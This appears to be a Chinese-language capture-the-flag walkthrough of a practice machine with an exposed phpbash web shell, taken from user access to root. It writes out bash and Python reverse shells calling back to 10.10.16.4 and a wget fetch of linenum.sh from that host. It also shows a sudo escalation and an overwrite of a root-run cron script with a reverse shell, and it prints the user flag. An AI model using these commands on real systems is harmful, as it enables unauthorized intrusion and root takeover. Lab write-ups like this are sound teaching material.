![image-20220402025110704](https://raw.githubusercontent.com/huamang/image/master/image-20220402025110704.png?token=ARNOAICNR2CZOH7M6J4IA5LCI5E5Y)

# USER

首先拿nmap扫一下，发现开启了80端口

![image-20220402025130761](https://raw.githubusercontent.com/huamang/image/master/image-20220402025130761.png?token=ARNOAICEDCW4DA35UFMQ3BDCI5E7S)

访问一下看看，是一个这样的页面

![image-20220402025040757](https://raw.githubusercontent.com/huamang/image/master/image-20220402025040757.png?token=ARNOAIE3BFEJRVNUNAHIWDDCI5E34)

看他的描述看起来像是一个，php写的远程shell工具

![image-20220402025022789](https://raw.githubusercontent.com/huamang/image/master/image-20220402025022789.png?token=ARNOAICXRWMM4M2ZQ5BPLZLCI5E2W)

试试能不能进入这里，先扫一个目录看看

![image-20220402025004616](https://raw.githubusercontent.com/huamang/image/master/image-20220402025004616.png?token=ARNOAICIOSRYBM5OW74XFP3CI5EZU)

这里有一目录dev

![image-20220402024950421](https://raw.githubusercontent.com/huamang/image/master/image-20220402024950421.png?token=ARNOAIFTKSJADGNCA3DTXK3CI5EYW)

这个phpbash.php就真是这个，不过权限是www-data

![image-20220402024934901](https://raw.githubusercontent.com/huamang/image/master/image-20220402024934901.png?token=ARNOAIGJMDE222MXJRAT3T3CI5EXW)

找一下user.txt

![image-20220402024914791](https://raw.githubusercontent.com/huamang/image/master/image-20220402024914791.png?token=ARNOAIBBBTN7OKWUN64LBYTCI5EWO)

拿下user

```
2c281f318555dbc1b856957c7147bfc1
```

![image-20220402024819658](https://raw.githubusercontent.com/huamang/image/master/image-20220402024819658.png?token=ARNOAICWXK32S776SHKOPLLCI5ETC)

# ROOT

接下来就是提权了，感觉这里面用的不舒服，有些命令执行没有回显，弹个shell来操作吧

```php
bash -i >& /dev/tcp/10.10.16.4/4444 0>&1
```

试了一下，竟然弹不出来，那就直接把脚本传上去吧，发现也不行，没有权限

![image-20220402024802627](https://raw.githubusercontent.com/huamang/image/master/image-20220402024802627.png?token=ARNOAIFKY6UCVADXFCN6I33CI5ER6)

换到tmp目录下载，成功传上去了

![image-20220402024746846](https://raw.githubusercontent.com/huamang/image/master/image-20220402024746846.png?token=ARNOAICLUXOSYS3S2Q6MXL3CI5ERA)

给个权限，然后执行

```
chmod 777 linpeas.sh
```

太难看了，再试试能不能弹shell吧

![image-20220402024641941](https://raw.githubusercontent.com/huamang/image/master/image-20220402024641941.png?token=ARNOAICKX5BSFMV6QG5A5NLCI5EM6)

试着用python来弹一下

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

python的弹成了

![image-20220402024619047](https://raw.githubusercontent.com/huamang/image/master/image-20220402024619047.png?token=ARNOAIDP2XSTKYJU3PTTU4TCI5ELQ)

传一个linenum上去进行提权测试

```
wget http://10.10.16.4:8000/linenum.sh
```

找到了一个，www-data用户可以不需要密码提成scriptmanager

![image-20220402024440260](https://raw.githubusercontent.com/huamang/image/master/image-20220402024440260.png?token=ARNOAIDEEUDGQ4YPF6SCPI3CI5EFK)

执行如下代码

```
sudo -u scriptmanager /bin/bash
```

成功提权成了scriptmanager

![image-20220402024425208](https://raw.githubusercontent.com/huamang/image/master/image-20220402024425208.png?token=ARNOAIAD54I2UGHRLQZ4CBLCI5EEM)

既然是scriptmanager，那就去scripts目录看看，这里可以看到，test.py的是本用户拥有的，而这个test.txt确是root有的

![image-20220402024406026](https://raw.githubusercontent.com/huamang/image/master/image-20220402024406026.png?token=ARNOAIGRZGQQF6OG6JSLTK3CI5EDG)

看一下test.py，内容就是把文件写进test.txt

![image-20220402024335418](https://raw.githubusercontent.com/huamang/image/master/image-20220402024335418.png?token=ARNOAIAHFZRF52TF5AYRRNDCI5EBI)

那这个地方就意味着，py文件是我可以编辑的，但是他的结果权限却是root，所以这个脚本是有scriptmanager来写的，由root来执行的

在执行了linpeas里面，我发现了这个细节，这说明他每隔五分钟就会执行一次test.py

![image-20220402024312437](https://raw.githubusercontent.com/huamang/image/master/image-20220402024312437.png?token=ARNOAIBUIU7YBAPTTFMDGELCI5D72)

所以这里我就可以写一些东西进去了，我选择的是再用python反弹一个shell，这样容错率高

这里注意符号的转义

```python
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.4\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py
```

kali开启监听，等一会就拿到反弹的shell了，权限是root，直接拿到flag

![image-20220402024124169](https://raw.githubusercontent.com/huamang/image/master/image-20220402024124169.png?token=ARNOAIFOJIKGD4ZMVJQZTWTCI5DZC)
